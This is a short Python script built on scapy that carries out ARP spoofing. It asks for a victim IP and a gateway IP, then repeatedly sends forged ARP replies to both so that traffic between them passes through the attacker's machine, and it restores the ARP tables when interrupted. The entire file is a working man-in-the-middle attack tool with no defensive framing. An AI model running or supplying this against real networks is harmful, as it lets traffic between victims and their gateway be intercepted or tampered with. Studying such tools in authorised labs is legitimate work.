from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import time
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target_ip', help='Target IP Address/Adresses')
    parser.add_argument('-m', '--MAC-address', dest='MAC_address', help='MAC-adress of the user')
    options = parser.parse_args()

    #Check for errors i.e if the user does not specify the target IP Address
    #Quit the program if the argument is missing
    #While quitting also display an error message
    if not options.target_ip:
        #Code to handle if interface is not specified
        parser.print_help()
        #parser.error("[-] Please specify an IP Address or Addresses, use --help for more info.")
    return options

options = get_args()

# def get_mac(ip):
#     """
#     Get the MAC address of the specified IP
#     """
#     answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=10)
#     for sent, received in answered:
#         return received.hwsrc
#     return None
def get_mac(ip):
    arp_request = ARP(pdst = ip)
    broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    """
    Spoof the target IP address pretending to be the spoof IP address
    """
    target_mac = get_mac(target_ip)
    print(target_mac)
    if not target_mac:
        print(f"Could not find MAC address for IP {target_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, spoof_ip):
    """
    Restore the network by reversing the ARP spoofing
    """
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    target_ip = input("VICTIM_IP:" )
    gateway_ip = input("GATEWAY_IP: ")
    
    try:
        print("Starting ARP spoofing. Press Ctrl+C to stop...")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Stopping ARP spoofing and restoring network...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("Network restored.")
